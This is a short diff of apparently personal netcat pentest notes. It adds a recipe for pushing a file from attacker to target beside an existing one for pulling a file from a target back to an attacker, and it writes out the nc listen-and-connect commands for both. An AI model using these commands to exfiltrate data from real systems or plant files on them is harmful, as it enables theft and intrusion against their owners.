@@ -11,9 +11,13 @@ nc [options] [host] [port number]
 
 
 ####sending files with netcat######
-1-move from target back to attacker:
+#1-move from target back to attacker:#
 -target: nc -l -p xxxx < filename
 -attacker nc x.x.x.x xxxx > filename
+
+#2-push from attacker to target:#
+target: nc -l -p xxxx > filename
+attacker: nc x.x.x.x xxxx < filename
 
 nc x.x.x.x xxxx < filename.out #send file
 nc -l xxxx > filename.in #receive file
